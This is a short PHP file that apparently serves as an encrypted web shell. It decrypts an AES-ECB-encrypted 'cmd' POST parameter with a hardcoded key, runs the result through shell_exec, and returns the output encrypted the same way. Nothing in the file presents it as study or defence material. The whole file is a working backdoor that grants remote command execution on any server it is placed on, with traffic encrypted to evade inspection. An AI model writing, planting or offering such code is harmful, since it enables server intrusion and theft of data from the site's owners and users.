<?php
function encrypt($data, $key)
{
    return base64_encode(openssl_encrypt($data, "aes-128-ecb", $key, OPENSSL_RAW_DATA));
}

function decrypt($data, $key)
{
    return openssl_decrypt(base64_decode($data), "aes-128-ecb", $key, OPENSSL_RAW_DATA);
}
$key = "1234567890123456";
// var_dump($_POST["cmd"]);
if (!empty($_POST["cmd"])) {
    $a = $_POST["cmd"];
    // echo $a;
    // echo decrypt($a, $key);
    // echo ($_POST["cmd"]);
    $res = shell_exec(decrypt($_POST["cmd"], $key));
    echo encrypt($res, $key);
}
